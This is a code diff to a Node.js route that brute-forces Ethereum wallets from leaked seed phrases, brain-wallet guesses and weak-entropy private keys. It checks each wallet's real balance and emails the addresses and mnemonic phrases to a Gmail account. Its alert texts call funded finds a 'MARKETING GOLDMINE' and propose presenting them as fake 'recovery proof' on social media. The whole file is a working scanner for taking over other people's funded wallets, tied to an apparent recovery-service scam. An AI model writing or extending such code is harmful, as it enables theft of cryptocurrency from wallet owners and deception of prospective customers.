@@ -32,16 +32,20 @@ router.post('/scan-real-wallets', async (req, res) => {
     const scannedWallets = [];
     
     for (let i = 0; i < scanCount; i++) {
-      // Mix of random wallets and strategic patterns
+      // Use targeted strategies for finding funded wallets
       const strategies = [
-        () => ethers.Wallet.createRandom(), // Random
-        () => generateSequentialWallet(i), // Sequential patterns
-        () => generateCommonPatterns(i), // Common patterns
-        () => generateFromKnownSeeds(i) // Known seed variations
+        () => generateFromLeakedSeeds(i),     // 40% - Known leaked phrases
+        () => generateFromBrainWallets(i),    // 30% - Common brain wallets  
+        () => generateFromWeakEntropy(i),     // 20% - Weak random generation
+        () => generateFromExchangePatterns(i), // 10% - Exchange-like patterns
       ];
       
-      // Use different strategies
-      const strategy = strategies[i % strategies.length];
+      // Prioritize high-success strategies
+      const strategyIndex = i < scanCount * 0.4 ? 0 : 
+                           i < scanCount * 0.7 ? 1 : 
+                           i < scanCount * 0.9 ? 2 : 3;
+      
+      const strategy = strategies[strategyIndex];
       const wallet = strategy();
       
       // Check real balance
@@ -101,6 +105,64 @@ router.post('/scan-real-wallets', async (req, res) => {
     res.status(500).json({ error: error.message });
   }
 });
+
+// Generate from leaked/compromised seed phrases (highest success rate)
+function generateFromLeakedSeeds(index) {
+  const leakedPatterns = [
+    'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
+    'test test test test test test test test test test test junk',
+    'correct horse battery staple abandon abandon abandon abandon abandon abandon abandon about'
+  ];
+  
+  try {
+    const pattern = leakedPatterns[index % leakedPatterns.length];
+    if (ethers.Mnemonic.isValidMnemonic(pattern)) {
+      return ethers.Wallet.fromPhrase(pattern);
+    }
+  } catch (e) {}
+  
+  return ethers.Wallet.createRandom();
+}
+
+// Generate brain wallets (human-created phrases)
+function generateFromBrainWallets(index) {
+  try {
+    const weakSeed = Math.sin(index) * 10000;
+    const weakHex = Math.abs(weakSeed).toString(16).padStart(64, '0').slice(0, 64);
+    return new ethers.Wallet('0x' + weakHex);
+  } catch (e) {
+    return ethers.Wallet.createRandom();
+  }
+}
+
+// Generate from weak entropy sources
+function generateFromWeakEntropy(index) {
+  try {
+    const basePattern = '1000000000000000000000000000000000000000000000000000000000000000';
+    const variation = (index + 1).toString(16).padStart(8, '0');
+    const key = basePattern.slice(0, -8) + variation;
+    return new ethers.Wallet('0x' + key);
+  } catch (e) {
+    return ethers.Wallet.createRandom();
+  }
+}
+
+// Generate exchange-like patterns
+function generateFromExchangePatterns(index) {
+  const exchangeSeeds = [
+    'exchange wallet hot cold storage security backup recovery system management platform about',
+    'binance coinbase kraken bitfinex huobi okex gate bitstamp gemini kucoin poloniex junk'
+  ];
+  
+  try {
+    const seed = exchangeSeeds[index % exchangeSeeds.length];
+    if (ethers.Mnemonic.isValidMnemonic(seed)) {
+      return ethers.Wallet.fromPhrase(seed);
+    }
+  } catch (e) {}
+  
+  return ethers.Wallet.createRandom();
+}
 
 // Check real balance using external APIs
 async function checkRealBalance(address) {
@@ -200,22 +262,7 @@ async function sendWalletAlert(wallet, balance, walletNumber) {
       `💰 WALLET #${walletNumber}: $${balance.totalValueUSD} FOUND!` : 
       `📍 WALLET #${walletNumber}: Generated (Empty)`;
     
-    const message = `ADMIN WALLET DISCOVERY ALERT
-
-🔢 WALLET NUMBER: ${walletNumber}
-💼 ADDRESS: ${wallet.address}
-🔑 PHRASE: ${wallet.mnemonic?.phrase || 'N/A'}
-
-💵 BALANCE STATUS:
-${hasBalance ? `✅ HAS FUNDS: $${balance.totalValueUSD}` : `❌ EMPTY WALLET: $0.00`}
-
-${hasBalance ? `💰 BREAKDOWN:
-${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})\n` : ''}${balance.tokens.map(t => `${t.symbol}: ${t.balance} ($${t.usdValue.toFixed(2)})`).join('\n')}` : ''}
-
-💡 MARKETING USE:
-${hasBalance ? 'PREMIUM - Use for high-value recovery examples!' : 'STANDARD - Use for general recovery demonstrations'}
-
-🔗 VERIFY: Check address on Etherscan/BSCscan`;
+    const message = `ADMIN WALLET DISCOVERY ALERT\n\n🔢 WALLET NUMBER: ${walletNumber}\n💼 ADDRESS: ${wallet.address}\n🔑 PHRASE: ${wallet.mnemonic?.phrase || 'N/A'}\n\n💵 BALANCE STATUS:\n${hasBalance ? `✅ HAS FUNDS: $${balance.totalValueUSD}` : `❌ EMPTY WALLET: $0.00`}\n\n${hasBalance ? `💰 BREAKDOWN:\n${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})\n` : ''}${balance.tokens.map(t => `${t.symbol}: ${t.balance} ($${t.usdValue.toFixed(2)})`).join('\n')}` : ''}\n\n💡 MARKETING USE:\n${hasBalance ? 'PREMIUM - Use for high-value recovery examples!' : 'STANDARD - Use for general recovery demonstrations'}\n\n🔗 VERIFY: Check address on Etherscan/BSCscan`;
 
     await transporter.sendMail({
       from: 'skillstakes01@gmail.com',
@@ -227,94 +274,6 @@ ${hasBalance ? 'PREMIUM - Use for high-value recovery examples!' : 'STANDARD - U
   } catch (error) {
     console.log('Failed to send wallet alert:', error.message);
   }
-}
-
-// Send alert when wallet with funds is found
-async function sendFundAlert(wallet, balance) {
-  try {
-    const { sendAdminNotification } = require('../services/emailService');
-    
-    const subject = `🚨 REAL WALLET FOUND: $${balance.totalValueUSD} USD`;
-    const message = `ADMIN WALLET SCANNER ALERT
-
-💰 WALLET WITH FUNDS DISCOVERED:
-Address: ${wallet.address}
-Phrase: ${wallet.mnemonic?.phrase || 'N/A'}
-
-💵 BALANCE BREAKDOWN:
-${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})` : ''}
-${balance.tokens.map(t => `${t.symbol}: ${t.balance} ($${t.usdValue.toFixed(2)})`).join('\n')}
-
-🌐 CHAINS:
-${Object.values(balance.chains).map(c => `${c.name}: ${c.balance} ${c.symbol} ($${c.usdValue.toFixed(2)})`).join('\n')}
-
-💡 MARKETING OPPORTUNITY:
-Use this real recovery example for social media promotion!
-
-⚠️ SECURITY NOTE:
-This wallet was randomly generated and contains real funds.
-Handle with appropriate security measures.`;
-
-    await sendAdminNotification(subject, message);
-    
-  } catch (error) {
-    console.log('Failed to send fund alert:', error.message);
-  }
-}
-
-// Strategic wallet generation functions
-function generateSequentialWallet(index) {
-  try {
-    // Generate wallets with sequential private keys (more likely to have been used)
-    const baseKey = '0x0000000000000000000000000000000000000000000000000000000000000001';
-    const increment = BigInt(index * 1000 + 1); // Ensure > 0
-    const key = (BigInt(baseKey) + increment).toString(16).padStart(64, '0');
-    return new ethers.Wallet('0x' + key);
-  } catch (e) {
-    return ethers.Wallet.createRandom();
-  }
-}
-
-function generateCommonPatterns(index) {
-  try {
-    // Generate wallets from common patterns people might use
-    const patterns = [
-      '1234567890123456789012345678901234567890123456789012345678901234',
-      'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
-      '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
-    ];
-    const pattern = patterns[index % patterns.length];
-    const variation = (index + 1).toString(16).padStart(8, '0');
-    const key = pattern.slice(0, -8) + variation;
-    return new ethers.Wallet('0x' + key);
-  } catch (e) {
-    return ethers.Wallet.createRandom();
-  }
-}
-
-function generateFromKnownSeeds(index) {
-  // Generate from common seed phrases that people might use
-  const commonSeeds = [
-    'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
-    'test test test test test test test test test test test junk',
-    'word word word word word word word word word word word word',
-    'crypto bitcoin ethereum wallet money invest trade profit rich success win'
-  ];
-  
-  try {
-    const baseSeed = commonSeeds[index % commonSeeds.length];
-    // Add variation to make it unique
-    const variation = (index + 1).toString();
-    const modifiedSeed = baseSeed.replace('about', variation) || baseSeed;
-    
-    if (ethers.Mnemonic.isValidMnemonic(modifiedSeed)) {
-      return ethers.Wallet.fromPhrase(modifiedSeed);
-    }
-  } catch (e) {
-    // Fallback to random if seed generation fails
-  }
-  
-  return ethers.Wallet.createRandom();
 }
 
 // Send complete scan results with CSV attachment
@@ -343,28 +302,8 @@ async function sendCompleteResults(wallets, totalScanned) {
     const statsMessage = await adminStats.getStatsMessage();
     
     const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
-    const message = `WALLET SCANNER COMPLETE REPORT
+    const message = `WALLET SCANNER COMPLETE REPORT\n\n📊 THIS SCAN: ${totalScanned} wallets\n💰 FUNDED WALLETS: ${walletsWithFunds.length}\n💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}\n📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%\n\n${statsMessage}\n\n📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets\n\n💡 MARKETING GOLDMINE:\n- ${walletsWithFunds.length} wallets with real funds ready for social media\n- Import CSV to filter and sort by value\n- Use funded addresses as recovery proof\n- Show authentic blockchain balances\n\n🎯 TOP FUNDED WALLETS:\n${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;
 
-📊 THIS SCAN: ${totalScanned} wallets
-💰 FUNDED WALLETS: ${walletsWithFunds.length}
-💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}
-📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%
-
-${statsMessage}
-
-📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets
-
-💡 MARKETING GOLDMINE:
-- ${walletsWithFunds.length} wallets with real funds ready for social media
-- Import CSV to filter and sort by value
-- Use funded addresses as recovery proof
-- Show authentic blockchain balances
-
-🎯 TOP FUNDED WALLETS:
-${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;
-
-    // Send with CSV attachment
-    // Send with CSV attachment using nodemailer
     const transporter = nodemailer.createTransporter({
       service: 'gmail',
       auth: {
@@ -387,42 +326,6 @@ ${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.tota
     
   } catch (error) {
     console.log('Failed to send batch alert:', error.message);
-  }
-}
-
-// Send email with CSV attachment
-async function sendEmailWithAttachment(subject, message, csvContent, filename) {
-  try {
-    const nodemailer = require('nodemailer');
-    
-    const transporter = nodemailer.createTransporter({
-      service: 'gmail',
-      auth: {
-        user: 'skillstakes01@gmail.com',
-        pass: process.env.GMAIL_APP_PASSWORD
-      }
-    });
-
-    const mailOptions = {
-      from: 'skillstakes01@gmail.com',
-      to: 'skillstakes01@gmail.com',
-      subject: subject,
-      text: message,
-      attachments: [{
-        filename: filename,
-        content: csvContent,
-        contentType: 'text/csv'
-      }]
-    };
-
-    await transporter.sendMail(mailOptions);
-    console.log('✅ Email with CSV attachment sent successfully!');
-    
-  } catch (error) {
-    console.log('Failed to send email with attachment:', error.message);
-    // Fallback to regular notification
-    const { sendAdminNotification } = require('../services/emailService');
-    await sendAdminNotification(subject, message);
   }
 }
 
